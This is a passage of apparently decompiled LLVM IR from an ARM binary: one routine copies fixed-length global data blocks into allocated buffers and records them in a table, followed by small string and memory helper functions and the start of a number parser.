  %v3_12978 = call i32 @function_12d58(i32 %v1_12968, i32 ptrtoint (i32* @global_var_1641c.504 to i32), i32 32)
  store i8 32, i8* bitcast (i32* @global_var_1edf8.505 to i8*), align 4
  %v0_12988 = load i32, i32* @r5, align 4
  store i32 %v0_12988, i32* @global_var_1edf4.506, align 4
  %v0_1298c = load i32, i32* @r6, align 4
  %v1_1298c = trunc i32 %v0_1298c to i8
  store i8 %v1_1298c, i8* bitcast (i32* @global_var_1edf9.507 to i8*), align 4
  %v1_12990 = call i32 @function_14140(i32 48)
  store i32 %v1_12990, i32* @r5, align 4
  %v3_129a0 = call i32 @function_12d58(i32 %v1_12990, i32 ptrtoint (i32* @global_var_16440.509 to i32), i32 48)
  %v0_129a8 = load i32, i32* @r7, align 4
  store i8 48, i8* bitcast (i32* @global_var_1ee00.510 to i8*), align 4
  %v0_129b0 = load i32, i32* @r5, align 4
  store i32 %v0_129b0, i32* @global_var_1edfc.511, align 4
  %v0_129b4 = load i32, i32* @r6, align 4
  %v1_129b4 = trunc i32 %v0_129b4 to i8
  store i8 %v1_129b4, i8* bitcast (i32* @global_var_1ee01.512 to i8*), align 4
  %v1_129b8 = call i32 @function_14140(i32 %v0_129a8)
  %v0_129bc = load i32, i32* @r7, align 4
  store i32 %v1_129b8, i32* @r5, align 4
  %v3_129c8 = call i32 @function_12d58(i32 %v1_129b8, i32 ptrtoint (i32* @global_var_16474.514 to i32), i32 %v0_129bc)
  %v0_129cc = load i32, i32* %sl.global-to-local, align 4
  %v0_129d0 = load i32, i32* @r5, align 4
  store i32 %v0_129d0, i32* @global_var_1ee04.515, align 4
  %v0_129d4 = load i32, i32* @r7, align 4
  %v1_129d4 = trunc i32 %v0_129d4 to i8
  store i8 %v1_129d4, i8* bitcast (i32* @global_var_1ee08.516 to i8*), align 4
  %v0_129d8 = load i32, i32* @r6, align 4
  %v1_129d8 = trunc i32 %v0_129d8 to i8
  store i8 %v1_129d8, i8* bitcast (i32* @global_var_1ee09.517 to i8*), align 4
  %v1_129dc = call i32 @function_14140(i32 %v0_129cc)
  %v0_129e4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_129dc, i32* @r5, align 4
  %v3_129ec = call i32 @function_12d58(i32 %v1_129dc, i32 ptrtoint (i32* @global_var_16484.519 to i32), i32 %v0_129e4)
  %v0_129f0 = load i32, i32* %r8.global-to-local, align 4
  %v0_129f4 = load i32, i32* @r5, align 4
  store i32 %v0_129f4, i32* @global_var_1ee0c.520, align 4
  %v1_129f8 = trunc i32 %v0_129e4 to i8
  store i8 %v1_129f8, i8* bitcast (i32* @global_var_1ee10.521 to i8*), align 4
  %v0_129fc = load i32, i32* @r6, align 4
  %v1_129fc = trunc i32 %v0_129fc to i8
  store i8 %v1_129fc, i8* bitcast (i32* @global_var_1ee11.522 to i8*), align 4
  %v1_12a00 = call i32 @function_14140(i32 %v0_129f0)
  %v0_12a08 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_12a00, i32* @r5, align 4
  %v3_12a10 = call i32 @function_12d58(i32 %v1_12a00, i32 ptrtoint (i32* @global_var_16490.524 to i32), i32 %v0_12a08)
  %v0_12a14 = load i32, i32* @r7, align 4
  %v0_12a18 = load i32, i32* @r5, align 4
  store i32 %v0_12a18, i32* @global_var_1ee14.525, align 4
  %v1_12a1c = trunc i32 %v0_12a08 to i8
  store i8 %v1_12a1c, i8* bitcast (i32* @global_var_1ee18.526 to i8*), align 4
  %v0_12a20 = load i32, i32* @r6, align 4
  %v1_12a20 = trunc i32 %v0_12a20 to i8
  store i8 %v1_12a20, i8* bitcast (i32* @global_var_1ee19.527 to i8*), align 4
  %v1_12a24 = call i32 @function_14140(i32 %v0_12a14)
  %v0_12a28 = load i32, i32* @r7, align 4
  store i32 %v1_12a24, i32* @r5, align 4
  %v3_12a34 = call i32 @function_12d58(i32 %v1_12a24, i32 ptrtoint (i32* @global_var_1649c.529 to i32), i32 %v0_12a28)
  %v0_12a38 = load i32, i32* %fp.global-to-local, align 4
  %v0_12a3c = load i32, i32* @r5, align 4
  store i32 %v0_12a3c, i32* @global_var_1ee1c.530, align 4
  %v0_12a40 = load i32, i32* @r7, align 4
  %v1_12a40 = trunc i32 %v0_12a40 to i8
  store i8 %v1_12a40, i8* bitcast (i32* @global_var_1ee20.531 to i8*), align 4
  %v0_12a44 = load i32, i32* @r6, align 4
  %v1_12a44 = trunc i32 %v0_12a44 to i8
  store i8 %v1_12a44, i8* bitcast (i32* @global_var_1ee21.532 to i8*), align 4
  %v1_12a48 = call i32 @function_14140(i32 %v0_12a38)
  %v0_12a50 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_12a48, i32* @r5, align 4
  %v3_12a58 = call i32 @function_12d58(i32 %v1_12a48, i32 ptrtoint (i32* @global_var_164ac.534 to i32), i32 %v0_12a50)
  %v0_12a5c = load i32, i32* %sb.global-to-local, align 4
  %v0_12a60 = load i32, i32* @r5, align 4
  store i32 %v0_12a60, i32* @global_var_1ee24.535, align 4
  %v1_12a64 = trunc i32 %v0_12a50 to i8
  store i8 %v1_12a64, i8* bitcast (i32* @global_var_1ee28.536 to i8*), align 4
  %v0_12a68 = load i32, i32* @r6, align 4
  %v1_12a68 = trunc i32 %v0_12a68 to i8
  store i8 %v1_12a68, i8* bitcast (i32* @global_var_1ee29.537 to i8*), align 4
  %v1_12a6c = call i32 @function_14140(i32 %v0_12a5c)
  %v0_12a74 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_12a6c, i32* @r5, align 4
  %v3_12a7c = call i32 @function_12d58(i32 %v1_12a6c, i32 ptrtoint (i32* @global_var_164c0.539 to i32), i32 %v0_12a74)
  %v0_12a84 = load i32, i32* @r5, align 4
  store i32 %v0_12a84, i32* @global_var_1ee2c.540, align 4
  %v1_12a88 = trunc i32 %v0_12a74 to i8
  store i8 %v1_12a88, i8* bitcast (i32* @global_var_1ee30.541 to i8*), align 4
  %v0_12a8c = load i32, i32* @r6, align 4
  %v1_12a8c = trunc i32 %v0_12a8c to i8
  store i8 %v1_12a8c, i8* bitcast (i32* @global_var_1ee31.542 to i8*), align 4
  %v1_12a90 = call i32 @function_14140(i32 8)
  store i32 %v1_12a90, i32* @r5, align 4
  %v4_12aa0 = call i32 @function_12d58(i32 %v1_12a90, i32 ptrtoint ([9 x i8]* @global_var_164d4.544 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1ee38.545 to i8*), align 4
  %v0_12ab0 = load i32, i32* @r5, align 4
  store i32 %v0_12ab0, i32* @global_var_1ee34.546, align 4
  %v0_12ab4 = load i32, i32* @r6, align 4
  %v1_12ab4 = trunc i32 %v0_12ab4 to i8
  store i8 %v1_12ab4, i8* bitcast (i32* @global_var_1ee39.547 to i8*), align 4
  %v1_12ab8 = call i32 @function_14140(i32 11)
  store i32 %v1_12ab8, i32* @r5, align 4
  %v3_12ac8 = call i32 @function_12d58(i32 %v1_12ab8, i32 ptrtoint (i32* @global_var_163bc.549 to i32), i32 11)
  %v0_12ad0 = load i32, i32* @r7, align 4
  store i8 11, i8* bitcast (i32* @global_var_1ee40.550 to i8*), align 4
  %v0_12ad8 = load i32, i32* @r5, align 4
  store i32 %v0_12ad8, i32* @global_var_1ee3c.551, align 4
  %v0_12adc = load i32, i32* @r6, align 4
  %v1_12adc = trunc i32 %v0_12adc to i8
  store i8 %v1_12adc, i8* bitcast (i32* @global_var_1ee41.552 to i8*), align 4
  %v1_12ae0 = call i32 @function_14140(i32 %v0_12ad0)
  %v0_12ae4 = load i32, i32* @r7, align 4
  store i32 %v1_12ae0, i32* @r5, align 4
  %v3_12af0 = call i32 @function_12d58(i32 %v1_12ae0, i32 ptrtoint (i32* @global_var_164e0.554 to i32), i32 %v0_12ae4)
  %v0_12af8 = load i32, i32* @r5, align 4
  store i32 %v0_12af8, i32* @global_var_1ee44.555, align 4
  %v0_12afc = load i32, i32* @r7, align 4
  %v1_12afc = trunc i32 %v0_12afc to i8
  store i8 %v1_12afc, i8* bitcast (i32* @global_var_1ee48.556 to i8*), align 4
  %v0_12b00 = load i32, i32* @r6, align 4
  %v1_12b00 = trunc i32 %v0_12b00 to i8
  store i8 %v1_12b00, i8* bitcast (i32* @global_var_1ee49.557 to i8*), align 4
  %v1_12b04 = call i32 @function_14140(i32 18)
  store i32 %v1_12b04, i32* @r5, align 4
  %v3_12b14 = call i32 @function_12d58(i32 %v1_12b04, i32 ptrtoint (i32* @global_var_164f0.559 to i32), i32 18)
  store i8 18, i8* bitcast (i32* @global_var_1ee50.560 to i8*), align 4
  %v0_12b24 = load i32, i32* @r5, align 4
  store i32 %v0_12b24, i32* @global_var_1ee4c.561, align 4
  %v0_12b28 = load i32, i32* @r6, align 4
  %v1_12b28 = trunc i32 %v0_12b28 to i8
  store i8 %v1_12b28, i8* bitcast (i32* @global_var_1ee51.562 to i8*), align 4
  %v1_12b2c = call i32 @function_14140(i32 25)
  store i32 %v1_12b2c, i32* @r5, align 4
  %v3_12b3c = call i32 @function_12d58(i32 %v1_12b2c, i32 ptrtoint (i32* @global_var_16504.564 to i32), i32 25)
  store i8 25, i8* bitcast (i32* @global_var_1ee58.565 to i8*), align 4
  %v0_12b4c = load i32, i32* @r5, align 4
  store i32 %v0_12b4c, i32* @global_var_1ee54.566, align 4
  %v0_12b50 = load i32, i32* @r6, align 4
  %v1_12b50 = trunc i32 %v0_12b50 to i8
  store i8 %v1_12b50, i8* bitcast (i32* @global_var_1ee59.567 to i8*), align 4
  %v1_12b54 = call i32 @function_14140(i32 111)
  store i32 111, i32* @r5, align 4
  store i32 %v1_12b54, i32* @r7, align 4
  %v3_12b68 = call i32 @function_12d58(i32 %v1_12b54, i32 ptrtoint (i32* @global_var_16520.569 to i32), i32 111)
  %v0_12b6c = load i32, i32* @r5, align 4
  %v0_12b70 = load i32, i32* @r7, align 4
  store i32 %v0_12b70, i32* @global_var_1ee5c.570, align 4
  %v1_12b74 = trunc i32 %v0_12b6c to i8
  store i8 %v1_12b74, i8* bitcast (i32* @global_var_1ee60.571 to i8*), align 4
  %v0_12b78 = load i32, i32* @r6, align 4
  %v1_12b78 = trunc i32 %v0_12b78 to i8
  store i8 %v1_12b78, i8* bitcast (i32* @global_var_1ee61.572 to i8*), align 4
  %v1_12b7c = call i32 @function_14140(i32 %v0_12b6c)
  %v0_12b80 = load i32, i32* @r5, align 4
  store i32 %v1_12b7c, i32* @r7, align 4
  %v3_12b8c = call i32 @function_12d58(i32 %v1_12b7c, i32 ptrtoint (i32* @global_var_16590.574 to i32), i32 %v0_12b80)
  %v0_12b94 = load i32, i32* @r7, align 4
  store i32 %v0_12b94, i32* @global_var_1ee64.575, align 4
  %v0_12b98 = load i32, i32* @r5, align 4
  %v1_12b98 = trunc i32 %v0_12b98 to i8
  store i8 %v1_12b98, i8* bitcast (i32* @global_var_1ee68.576 to i8*), align 4
  %v0_12b9c = load i32, i32* @r6, align 4
  %v1_12b9c = trunc i32 %v0_12b9c to i8
  store i8 %v1_12b9c, i8* bitcast (i32* @global_var_1ee69.577 to i8*), align 4
  %v1_12ba0 = call i32 @function_14140(i32 110)
  %v0_12ba4 = load i32, i32* @r5, align 4
  %v1_12ba4 = add i32 %v0_12ba4, -1
  store i32 %v1_12ba4, i32* @r5, align 4
  store i32 %v1_12ba0, i32* @r7, align 4
  %v3_12bb4 = call i32 @function_12d58(i32 %v1_12ba0, i32 ptrtoint (i32* @global_var_16600.579 to i32), i32 %v1_12ba4)
  %v0_12bb8 = load i32, i32* @r5, align 4
  %v0_12bbc = load i32, i32* @r7, align 4
  store i32 %v0_12bbc, i32* @global_var_1ee6c.580, align 4
  %v1_12bc0 = trunc i32 %v0_12bb8 to i8
  store i8 %v1_12bc0, i8* bitcast (i32* @global_var_1ee70.581 to i8*), align 4
  %v0_12bc4 = load i32, i32* @r6, align 4
  %v1_12bc4 = trunc i32 %v0_12bc4 to i8
  store i8 %v1_12bc4, i8* bitcast (i32* @global_var_1ee71.582 to i8*), align 4
  %v1_12bc8 = call i32 @function_14140(i32 %v0_12bb8)
  %v0_12bcc = load i32, i32* @r5, align 4
  store i32 %v1_12bc8, i32* @r7, align 4
  %v3_12bd8 = call i32 @function_12d58(i32 %v1_12bc8, i32 ptrtoint (i32* @global_var_16670.584 to i32), i32 %v0_12bcc)
  %v0_12be0 = load i32, i32* @r5, align 4
  %v1_12be0 = trunc i32 %v0_12be0 to i8
  store i8 %v1_12be0, i8* bitcast (i32* @global_var_1ee78.585 to i8*), align 4
  %v0_12be4 = load i32, i32* @r7, align 4
  store i32 %v0_12be4, i32* @global_var_1ee74.586, align 4
  %v0_12be8 = load i32, i32* @r6, align 4
  %v1_12be8 = trunc i32 %v0_12be8 to i8
  store i8 %v1_12be8, i8* bitcast (i32* @global_var_1ee79.587 to i8*), align 4
  %v1_12bec = call i32 @function_14140(i32 117)
  %v3_12bfc = call i32 @function_12d58(i32 %v1_12bec, i32 ptrtoint (i32* @global_var_166e0.589 to i32), i32 117)
  %v0_12c04 = load i32, i32* @r6, align 4
  %v1_12c04 = trunc i32 %v0_12c04 to i8
  store i8 %v1_12c04, i8* bitcast (i32* @global_var_1ee81.590 to i8*), align 4
  store i32 %v1_12bec, i32* @global_var_1ee7c.591, align 4
  store i8 117, i8* bitcast (i32* @global_var_1ee80.592 to i8*), align 4
  ret i32 %v3_12bfc

; uselistorder directives
  uselistorder i32 %v1_12bc8, { 1, 0 }
  uselistorder i32 %v1_12ba0, { 1, 0 }
  uselistorder i32 %v1_12b7c, { 1, 0 }
  uselistorder i32 %v1_12b54, { 1, 0 }
  uselistorder i32 %v1_12ae0, { 1, 0 }
  uselistorder i32 %v1_12a6c, { 1, 0 }
  uselistorder i32 %v1_12a48, { 1, 0 }
  uselistorder i32 %v1_12a24, { 1, 0 }
  uselistorder i32 %v1_12a00, { 1, 0 }
  uselistorder i32 %v1_129dc, { 1, 0 }
  uselistorder i32 %v1_129b8, { 1, 0 }
  uselistorder i32 %v1_128f0, { 1, 0 }
  uselistorder i32 %v1_1278c, { 1, 0 }
  uselistorder i32 %v1_12768, { 1, 0 }
  uselistorder i32 %v1_126a4, { 1, 0 }
  uselistorder i32 %v1_1267c, { 1, 0 }
  uselistorder i32 %v1_12608, { 1, 0 }
  uselistorder i32 %v1_12568, { 1, 0 }
  uselistorder i32 %v1_124f4, { 1, 0 }
  uselistorder i32 %v1_124cc, { 1, 0 }
  uselistorder i32 %v1_124a4, { 1, 0 }
  uselistorder i32 %v1_12470, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 3, { 2, 1, 0 }
  uselistorder i8 6, { 6, 7, 4, 8, 5, 9, 0, 10, 11, 1, 2, 3 }
  uselistorder i8 4, { 4, 3, 2, 0, 1 }
  uselistorder i8 11, { 2, 3, 4, 0, 1 }
  uselistorder i8 5, { 12, 13, 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 11, 14, 9 }
  uselistorder i32 (i32, i32, i32)* @function_12d58, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 9, 8, 7, 3, 2, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1ece4.338 to i32), { 5, 0, 1, 2, 3, 4 }
}

define i32 @function_12cdc(i8* %arg1) local_unnamed_addr {
dec_label_pc_12cdc:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v3_12ce0 = load i8, i8* %arg1, align 1
  %v4_12ce0 = zext i8 %v3_12ce0 to i32
  %v2_12ce4 = icmp eq i8 %v3_12ce0, 0
  br i1 %v2_12ce4, label %dec_label_pc_12d00, label %bb

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12cf0, %dec_label_pc_12cdc
  %merge = phi i32 [ %v4_12ce0, %dec_label_pc_12cdc ], [ %v1_12cf0, %dec_label_pc_12cf0 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_12cdc
  br label %dec_label_pc_12cf0

dec_label_pc_12cf0:                               ; preds = %dec_label_pc_12cf0, %bb
  %v0_12cf0 = phi i32 [ %v1_12cf0, %dec_label_pc_12cf0 ], [ 0, %bb ]
  %v1_12cf0 = add i32 %v0_12cf0, 1
  %v2_12cf4 = add i32 %v1_12cf0, %tmp
  %v3_12cf4 = inttoptr i32 %v2_12cf4 to i8*
  %v4_12cf4 = load i8, i8* %v3_12cf4, align 1
  %v2_12cf8 = icmp eq i8 %v4_12cf4, 0
  br i1 %v2_12cf8, label %dec_label_pc_12d00, label %dec_label_pc_12cf0

; uselistorder directives
  uselistorder i32 %v1_12cf0, { 1, 0, 2 }
}

define i32 @function_12d04(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d04:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12d04 = load i8, i8* %arg1, align 1
  %v3_12d04 = zext i8 %v2_12d04 to i32
  %v2_12d08 = icmp eq i8 %v2_12d04, 0
  br i1 %v2_12d08, label %dec_label_pc_12d4c, label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12d04
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12d14, %dec_label_pc_12d10
  %v0_12d14 = phi i32 [ %v1_12d14, %dec_label_pc_12d14 ], [ 0, %dec_label_pc_12d10 ]
  %v1_12d14 = add i32 %v0_12d14, 1
  store i32 %v1_12d14, i32* %ip.global-to-local, align 4
  %v2_12d18 = add i32 %v1_12d14, %tmp
  %v3_12d18 = inttoptr i32 %v2_12d18 to i8*
  %v4_12d18 = load i8, i8* %v3_12d18, align 1
  %v2_12d1c = icmp eq i8 %v4_12d18, 0
  br i1 %v2_12d1c, label %dec_label_pc_12d24, label %dec_label_pc_12d14

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d14
  %v7_12d24 = icmp eq i32 %v0_12d14, -2
  br i1 %v7_12d24, label %dec_label_pc_12d44, label %dec_label_pc_12d30.preheader

dec_label_pc_12d30.preheader:                     ; preds = %dec_label_pc_12d24, %dec_label_pc_12d4c
  %storemerge = phi i32 [ %v3_12d04, %dec_label_pc_12d4c ], [ %v1_12d14, %dec_label_pc_12d24 ]
  %v2_12d3c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12d30

dec_label_pc_12d30:                               ; preds = %dec_label_pc_12d30.dec_label_pc_12d30_crit_edge, %dec_label_pc_12d30.preheader
  %v2_12d3c = phi i32 [ %v5_12d3c, %dec_label_pc_12d30.dec_label_pc_12d30_crit_edge ], [ %v2_12d3c.pre, %dec_label_pc_12d30.preheader ]
  %v0_12d34 = phi i32 [ %v0_12d34.pre, %dec_label_pc_12d30.dec_label_pc_12d30_crit_edge ], [ %tmp, %dec_label_pc_12d30.preheader ]
  %v0_12d30 = phi i32 [ %v0_12d30.pre, %dec_label_pc_12d30.dec_label_pc_12d30_crit_edge ], [ %storemerge, %dec_label_pc_12d30.preheader ]
  %v1_12d30 = add i32 %v0_12d30, -1
  store i32 %v1_12d30, i32* @r2, align 4
  %v1_12d34 = inttoptr i32 %v0_12d34 to i8*
  %v2_12d34 = load i8, i8* %v1_12d34, align 1
  %v5_12d34 = add i32 %v0_12d34, 1
  store i32 %v5_12d34, i32* %r1.global-to-local, align 4
  %v3_12d38 = icmp eq i32 %v0_12d30, 0
  %v3_12d3c = inttoptr i32 %v2_12d3c to i8*
  store i8 %v2_12d34, i8* %v3_12d3c, align 1
  %v4_12d3c = load i32, i32* @r0, align 4
  %v5_12d3c = add i32 %v4_12d3c, 1
  store i32 %v5_12d3c, i32* @r0, align 4
  br i1 %v3_12d38, label %dec_label_pc_12d44.loopexit, label %dec_label_pc_12d30.dec_label_pc_12d30_crit_edge

dec_label_pc_12d30.dec_label_pc_12d30_crit_edge:  ; preds = %dec_label_pc_12d30
  %v0_12d30.pre = load i32, i32* @r2, align 4
  %v0_12d34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12d30

dec_label_pc_12d44.loopexit:                      ; preds = %dec_label_pc_12d30
  %v0_12d44.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d44.loopexit, %dec_label_pc_12d24
  %v0_12d44 = phi i32 [ %v0_12d44.pre, %dec_label_pc_12d44.loopexit ], [ %v1_12d14, %dec_label_pc_12d24 ]
  ret i32 %v0_12d44

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d04
  store i32 %v3_12d04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d30.preheader

; uselistorder directives
  uselistorder i32 %v5_12d3c, { 1, 0 }
  uselistorder i32 %v0_12d34, { 1, 0 }
  uselistorder i32 %v1_12d14, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_12d04, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12d30.preheader, { 1, 0 }
}

define i32 @function_12d58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12d58:
  %ip.global-to-local = alloca i32, align 4
  %v2_12d58 = icmp eq i32 %arg3, 0
  br i1 %v2_12d58, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12d64, %dec_label_pc_12d58
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12d58
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %dec_label_pc_12d64, %bb
  %v0_12d64 = phi i32 [ %v1_12d6c, %dec_label_pc_12d64 ], [ 0, %bb ]
  %v2_12d64 = add i32 %v0_12d64, %arg2
  %v3_12d64 = inttoptr i32 %v2_12d64 to i8*
  %v4_12d64 = load i8, i8* %v3_12d64, align 1
  %v4_12d68 = add i32 %v0_12d64, %arg1
  %v5_12d68 = inttoptr i32 %v4_12d68 to i8*
  store i8 %v4_12d64, i8* %v5_12d68, align 1
  %v0_12d6c = load i32, i32* %ip.global-to-local, align 4
  %v1_12d6c = add i32 %v0_12d6c, 1
  store i32 %v1_12d6c, i32* %ip.global-to-local, align 4
  %v9_12d70 = icmp eq i32 %v1_12d6c, %arg3
  br i1 %v9_12d70, label %.loopexit, label %dec_label_pc_12d64

; uselistorder directives
  uselistorder i32 %v1_12d6c, { 1, 2, 0 }
}

define i32 @function_12d7c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d7c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_12d7c = icmp eq i32 %arg2, 0
  br i1 %v2_12d7c, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12d8c, %dec_label_pc_12d7c
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12d7c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12d8c

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12d8c.dec_label_pc_12d8c_crit_edge, %bb
  %v2_12d8c = phi i32 [ %v1_12d90, %dec_label_pc_12d8c.dec_label_pc_12d8c_crit_edge ], [ 0, %bb ]
  %v0_12d8c.off0 = phi i8 [ %extract.t, %dec_label_pc_12d8c.dec_label_pc_12d8c_crit_edge ], [ 0, %bb ]
  %v4_12d8c = add i32 %v2_12d8c, %arg1
  %v5_12d8c = inttoptr i32 %v4_12d8c to i8*
  store i8 %v0_12d8c.off0, i8* %v5_12d8c, align 1
  %v0_12d90 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d90 = add i32 %v0_12d90, 1
  store i32 %v1_12d90, i32* %r3.global-to-local, align 4
  %v9_12d94 = icmp eq i32 %v1_12d90, %arg2
  br i1 %v9_12d94, label %.loopexit, label %dec_label_pc_12d8c.dec_label_pc_12d8c_crit_edge

dec_label_pc_12d8c.dec_label_pc_12d8c_crit_edge:  ; preds = %dec_label_pc_12d8c
  %v0_12d8c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_12d8c.pre to i8
  br label %dec_label_pc_12d8c

; uselistorder directives
  uselistorder i32 %v1_12d90, { 1, 2, 0 }
}

define i32 @function_12da0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12da0:
  store i32 %arg4, i32* @lr, align 4
  %v7_12db4 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_12db4, label %dec_label_pc_12db8, label %dec_label_pc_12dc0

dec_label_pc_12db8:                               ; preds = %dec_label_pc_12dd4, %dec_label_pc_12da0, %dec_label_pc_12dc0
  ret i32 -1

dec_label_pc_12dc0:                               ; preds = %dec_label_pc_12da0
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_12db8, label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %dec_label_pc_12dc0
  br label %dec_label_pc_12de0

dec_label_pc_12dd4:                               ; preds = %dec_label_pc_12df8, %dec_label_pc_12de0
  %v1_12dd4 = add i32 %v0_12e00, 1
  %v9_12dd8 = icmp eq i32 %v1_12dd4, %arg2
  br i1 %v9_12dd8, label %dec_label_pc_12db8, label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12dd4, %dec_label_pc_12dc8
  %v0_12e00 = phi i32 [ %v1_12dd4, %dec_label_pc_12dd4 ], [ 0, %dec_label_pc_12dc8 ]
  %v0_12dec = phi i32 [ %v1_12dec., %dec_label_pc_12dd4 ], [ 0, %dec_label_pc_12dc8 ]
  %v2_12de0 = add i32 %v0_12dec, %arg3
  %v3_12de0 = inttoptr i32 %v2_12de0 to i8*
  %v4_12de0 = load i8, i8* %v3_12de0, align 1
  %v2_12de4 = add i32 %v0_12e00, %arg1
  %v3_12de4 = inttoptr i32 %v2_12de4 to i8*
  %v4_12de4 = load i8, i8* %v3_12de4, align 1
  %v9_12de8 = icmp eq i8 %v4_12de4, %v4_12de0
  %v1_12dec = add i32 %v0_12dec, 1
  %v1_12dec. = select i1 %v9_12de8, i32 %v1_12dec, i32 0
  br i1 %v9_12de8, label %dec_label_pc_12df8, label %dec_label_pc_12dd4

dec_label_pc_12df8:                               ; preds = %dec_label_pc_12de0
  %v9_12df8 = icmp eq i32 %v1_12dec., %arg4
  br i1 %v9_12df8, label %dec_label_pc_12e00, label %dec_label_pc_12dd4

dec_label_pc_12e00:                               ; preds = %dec_label_pc_12df8
  %v1_12e00 = add i32 %v0_12e00, 1
  ret i32 %v1_12e00

; uselistorder directives
  uselistorder i1 %v9_12de8, { 1, 0 }
  uselistorder i32 %v0_12dec, { 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12db8, { 0, 2, 1 }
}

define i32 @function_12e08(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12e08:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_12e08 = load i32, i32* @r4, align 4
  store i32 %v3_12e08, i32* %stack_var_-28, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12e14

dec_label_pc_12e14:                               ; preds = %.thread, %dec_label_pc_12e2c, %bb, %dec_label_pc_12e08
  %v0_12e14 = phi i32 [ %tmp, %dec_label_pc_12e08 ], [ %v5_12e14, %bb ], [ %v5_12e14, %dec_label_pc_12e2c ], [ %v5_12e14, %.thread ]
  %v1_12e14 = inttoptr i32 %v0_12e14 to i8*
  %v2_12e14 = load i8, i8* %v1_12e14, align 1
  %v3_12e14 = zext i8 %v2_12e14 to i32
  %v5_12e14 = add i32 %v0_12e14, 1
  store i32 %v5_12e14, i32* %r5.global-to-local, align 4
  %v7_12e1c = icmp eq i8 %v2_12e14, 9
  br i1 %v7_12e1c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12e14
  store i32 %v3_12e14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e14

bb:                                               ; preds = %dec_label_pc_12e14
  %v8_12e20 = icmp eq i8 %v2_12e14, 32
  store i32 %v3_12e14, i32* %r4.global-to-local, align 4
  br i1 %v8_12e20, label %dec_label_pc_12e14, label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %bb
  %v7_12e2c = icmp eq i8 %v2_12e14, 10
  br i1 %v7_12e2c, label %dec_label_pc_12e14, label %dec_label_pc_12e34

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12e2c
  %v7_12e34 = icmp eq i8 %v2_12e14, 45
  br i1 %v7_12e34, label %dec_label_pc_12f14, label %dec_label_pc_12e3c

dec_label_pc_12e3c:                               ; preds = %dec_label_pc_12e34
  %v7_12e3c = icmp eq i8 %v2_12e14, 43
  br i1 %v7_12e3c, label %bb48, label %dec_label_pc_12e4c

bb48:                                             ; preds = %dec_label_pc_12e3c
